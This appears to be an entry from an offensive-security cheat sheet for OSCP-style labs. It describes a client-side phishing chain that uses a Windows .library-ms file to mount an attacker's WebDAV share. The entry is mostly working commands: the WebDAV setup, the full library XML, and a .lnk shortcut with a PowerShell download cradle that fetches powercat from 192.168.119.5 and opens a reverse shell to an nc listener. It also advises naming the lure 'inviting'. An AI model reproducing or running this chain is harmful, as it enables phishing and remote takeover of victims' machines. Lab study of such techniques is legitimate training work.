title: Client-Side — Windows Library (.library-ms) + WebDAV + Shortcut
body: The reliable client-side chain when you know nothing about the target's software: a .library-ms file makes Explorer mount YOUR WebDAV share as a trusted-looking folder; inside it sits a .lnk shortcut that runs a PowerShell download-cradle. The victim opens the library, sees a folder with a shortcut, double-clicks it -> reverse shell. No Office required, no 'enable macros' prompt. Four services on Kali: WebDAV (serves the folder), Python web server (serves powercat.ps1), nc listener (catches the shell), and swaks (mails the library file).
cmd:
# ══════════════════════════════════════════════════
# 1) WebDAV share on Kali (port 80, anonymous)
# ══════════════════════════════════════════════════
mkdir -p /home/kali/beyond/webdav
~/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/
#   anonymous write is fine for a lab; it will warn about no-SSL — ignore for OSCP.

# ══════════════════════════════════════════════════
# 2) The .library-ms file  (point <url> at YOUR Kali IP)
# ══════════════════════════════════════════════════
# Save as config.Library-ms (note the .Library-ms extension exactly):
cat > config.Library-ms <<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.5</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
XML
#   <url> = your Kali WebDAV IP. That's the whole trick — Explorer mounts it.

# ══════════════════════════════════════════════════
# 3) The shortcut (.lnk)  — built on a Windows box (WINPREP via RDP)
# ══════════════════════════════════════════════════
# Right-click Desktop > New > Shortcut, paste as the target:
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"
#   Name it something inviting (e.g. 'Install'). Then copy the .lnk
#   into the Kali WebDAV dir so it appears inside the mounted folder.

# ══════════════════════════════════════════════════
# 4) Serve powercat + catch the shell
# ══════════════════════════════════════════════════
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 /home/kali/beyond/
cd /home/kali/beyond && python3 -m http.server 8000      # serves powercat.ps1
nc -nvlp 4444                                            # in a new tab — catches the shell

# ── Confirm foothold ──
# whoami / hostname / ipconfig  -> note the internal IP, subnet, gateway
warn: Extension must be exactly .Library-ms (VS Code won't add it for you — name it explicitly). The .lnk goes INSIDE the WebDAV root so it shows in the mounted folder. Ports must match across all three files: library <url> = WebDAV IP:80, .lnk cradle = web server IP:8000, powercat -p = nc port 4444. You can serve powercat from the WebDAV share instead, but a separate port (8000) is cleaner and more flexible.

choices.label: Got the shell — stabilize / upgrade it
